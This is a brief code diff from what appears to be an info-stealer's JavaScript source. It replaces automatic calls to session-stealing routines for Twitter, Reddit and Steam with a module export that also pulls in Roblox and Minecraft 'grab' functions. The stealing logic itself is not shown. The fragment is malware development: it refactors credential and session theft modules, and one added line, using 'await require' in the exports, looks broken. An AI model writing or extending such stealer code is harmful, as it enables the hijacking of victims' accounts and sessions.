@@ -80,6 +80,7 @@ const steam = async () => {
   }
 };
 
-if (sessionStealing.twitter) twitter();
-if (sessionStealing.reddit) reddit();
-if (sessionStealing.steam) steam();
+module.exports = {
+  twitter, reddit, steam, roblox: await require('../functions/grab-roblox'),
+  minecraft: () => require('../functions/grab-mc')
+};
